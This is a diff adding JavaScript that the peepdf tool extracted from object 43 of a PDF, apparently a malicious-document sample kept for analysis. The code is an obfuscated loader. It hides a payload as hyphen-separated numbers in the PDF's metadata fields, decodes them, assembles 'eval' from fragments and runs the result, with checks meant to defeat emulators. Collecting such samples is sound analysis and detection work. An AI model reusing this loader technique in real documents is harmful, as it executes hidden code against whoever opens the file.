@@ -1,0 +1,17 @@
+// peepdf comment: Javascript code located in object 43 (version 0)
+
+if (app.language) var bbtersbt = event;
+if (app.isValidSaveLocation) var bryesrby = bbtersbt.target;
+var b34bt43 = bryesrby["aut" + ((app.language) ? "hor" : 12)] + bryesrby["subje" + ((app.language) ? "ct" : 12)] + bryesrby["keywor" + ((app.language) ? "ds" : 12)] + bryesrby["crea" + ((app.language) ? "tor" : 12)] + bryesrby["produ" + ((app.language) ? "cer" : 12)];
+b34bt43 = b34bt43.split("-");
+s = "";
+z = b34bt43;
+for (i = 0; i < z["length"] - 1; i++) {
+    s += String.fromCharCode(z[i] - 31);
+}
+e = "e";
+if (1) e += ["v"];
+if (1) e += ["a"];
+if (1) e += "l";
+if (app.listToolbarButtons()) this[e](s);
+
